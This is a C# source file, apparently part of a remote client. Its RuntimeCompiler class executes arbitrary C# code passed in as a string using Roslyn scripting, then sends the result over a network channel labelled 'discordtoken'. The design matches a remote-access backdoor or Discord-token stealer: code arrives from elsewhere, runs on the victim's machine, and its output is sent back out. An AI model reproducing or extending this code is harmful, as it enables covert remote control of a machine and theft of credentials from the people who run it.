using Microsoft.CodeAnalysis.CSharp.Scripting;
using Microsoft.CodeAnalysis.Scripting;

namespace Client
{
    public static class RuntimeCompiler
    {
        public static async Task CompileCSharp(string code)
        {
            Thread compileThread = new Thread(async () =>
            {
                try
                {
                    //// Konfiguration des Scripting-Hosts
                    //var options = ScriptOptions.Default
                    //    .WithImports("System");

                    //// Führe den Code als Script aus
                    ////var result = await CSharpScript.EvaluateAsync(code, options);
                    //var result = CSharpScript.RunAsync(code, options);

                    //Console.WriteLine("Scriptergebnis: " + result.ToString());

                    var options = ScriptOptions.Default
                        .WithImports("System");

                    // Führe den Code als Script aus
                    var state = await CSharpScript.RunAsync(code, options);

                    // Erhalte das Ergebnis aus dem Script-State
                    var result = state.ReturnValue;

                    if(result != null)
                    {
                        Communication.Network.Send(result.ToString(), "discordtoken");
                    }

                    Console.WriteLine("Scriptergebnis: " + result.ToString());
                }
                catch (CompilationErrorException ex)
                {
                    // Bei Fehler im Code gebe die Fehlermeldung aus
                    Console.WriteLine($"Fehler beim Kompilieren: {ex.Message}");
                }
                catch (Exception ex)
                {
                    // Bei anderen Fehlern gebe die Fehlermeldung aus
                    Console.WriteLine($"Fehler beim Ausführen: {ex.Message}");
                }
            });
            compileThread.Start();
        }
    }
}
